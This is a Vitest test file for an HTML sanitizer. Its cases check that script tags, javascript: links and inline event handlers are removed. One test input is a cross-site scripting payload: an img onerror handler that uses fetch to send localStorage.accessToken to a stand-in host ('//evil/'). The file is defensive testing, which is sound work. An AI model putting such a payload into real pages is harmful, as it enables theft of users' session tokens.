// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from '../sanitizeHtml';

describe('sanitizeHtml', () => {
  it('keeps safe formatting tags', () => {
    const out = sanitizeHtml('<p>Hello <strong>world</strong></p><ul><li>a</li></ul>');
    expect(out).toContain('<strong>world</strong>');
    expect(out).toContain('<li>a</li>');
  });

  it('strips <script> tags', () => {
    const out = sanitizeHtml('<p>ok</p><script>alert(1)</script>');
    expect(out).not.toContain('<script>');
    expect(out).not.toContain('alert(1)');
  });

  it('strips onerror handlers (the token-theft vector)', () => {
    const out = sanitizeHtml(`<img src=x onerror="fetch('//evil/'+localStorage.accessToken)">`);
    expect(out.toLowerCase()).not.toContain('onerror');
    expect(out).not.toContain('localStorage');
  });

  it('strips javascript: URIs on links', () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
    expect(out.toLowerCase()).not.toContain('javascript:');
  });

  it('strips inline event handlers on any element', () => {
    const out = sanitizeHtml('<div onclick="steal()">x</div>');
    expect(out.toLowerCase()).not.toContain('onclick');
  });

  it('handles null/empty safely', () => {
    expect(sanitizeHtml('')).toBe('');
    expect(sanitizeHtml(null)).toBe('');
    expect(sanitizeHtml(undefined)).toBe('');
  });
});
